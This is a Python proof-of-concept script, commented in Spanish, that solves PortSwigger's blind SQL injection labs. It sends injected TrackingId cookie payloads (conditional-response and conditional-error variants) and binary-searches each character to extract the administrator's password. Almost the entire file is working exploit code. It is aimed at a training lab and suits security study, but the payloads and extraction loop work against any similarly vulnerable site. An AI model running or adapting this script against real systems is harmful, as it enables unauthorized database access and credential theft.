#!/usr/bin/env python

# ---------------------------------------------------------------------------------------------------------
# Portswigger Blind Conditional SQLi
#
# Conditional responses: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
#
# Conditional errors: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors
#
# ---------------------------------------------------------------------------------------------------------

# ------------------
# Ookami
# Hackers Fight Club
# ------------------

# *******
# Imports
# *******
import requests
from argparse import ArgumentParser
from termcolor import colored

# *****************
# Función principal
# *****************
def main():

    # ++++++++++++++++++++++++
    # Configuración del parser
    # ++++++++++++++++++++++++

    parser = ArgumentParser(description="PoC que implementa la solución a los laboratorios de Blind SQLi condicionales")
    parser.add_argument("url", type=str, help="URL del laboratorio de Blind SQLi de PortSwigger")
    parser.add_argument("expected_string", type=str, help="Cadena de texto que se espera al realizar la inyección")
    parser.add_argument("--error", dest="error", action="store_true", help="Realiza una inyección de tipo error condicional")

    # Parsing de argumentos
    args = parser.parse_args()

    # ++++++++
    # Alfabeto
    # ++++++++

    # Mayúsculas, minúsculas y números
    # alfabeto=[chr(num) for num in range(48,123) if chr(num).isalnum()]

    # Minúsculas y números
    alfabeto=[chr(num) for num in range(48,58)]+ [chr(num) for num in range(97,123)]

    # ++++++++++++++++++++++++++++++
    # Definición de la inyección SQL
    # ++++++++++++++++++++++++++++++

    if args.error:
        # Inyección para el laboratorio de errores condicionales
        inyeccion="' OR (SELECT CASE WHEN (SUBSTR(password,{},1) {} '{}') THEN 1/0 ELSE 0 END FROM users WHERE username='administrator') = 0 -- -"
    else:
        # Inyección para el laboratorio de respuestas condicionales
        inyeccion="' OR SUBSTRING((SELECT password FROM users WHERE username='administrator'),{},1) {} '{}' -- -"

    # +++++++++++
    # Explotación
    # +++++++++++

    # Bandera que marca el final de la contraseña
    found = True

    # Respuesta esperada
    condition=args.expected_string
    star_change=True

    # Acumuladores de contraseña y posición
    password=''
    pos=0

    # Inicialización de una sesión Requests
    session=requests.Session()

    # Ciclo de inyecciones
    while found:

        # Ajuste de variables
        found = False
        pos +=1
        head=0
        tail=len(alfabeto)

        # Busqueda binaria
        while head < tail:

            # Define el simbolo de carga
            star= '*' if star_change == 0 else '+'

            # Selecciona el caracter a la mitad
            half= (head+tail) // 2
            car = alfabeto[half]

            # Primera inyección
            cookies={ 'TrackingId': inyeccion.format(pos,'=',car)}
            response = session.get(args.url,cookies=cookies)

            # Va imprimiendo la contraseña en pantalla
            print(f"\r[{colored(star,'blue')}] {colored(password,'green')+colored(car,'yellow')}",end='',flush=True)

            # De obtener la respuesta esperada, agrega el caracter a la contraseña.
            if condition in response.text:
                found = True
                password+=car
                break

            # En caso contrario realiza una segunda inyección para comparar el caracter
            else:
                cookies = { 'TrackingId' : inyeccion.format(pos,'<',car) }
                response = session.get(args.url,cookies=cookies)
                if condition in response.text:
                    tail=half
                else:
                    head=half+1

            # Alterna el simbolo de carga
            star_change = not star_change

    # Imprime la contraseña encontrada
    print(f'\rContraseña de Administrator: {colored(password,'green')}',flush=True)

# Ejecución
if __name__ == '__main__':
    main()
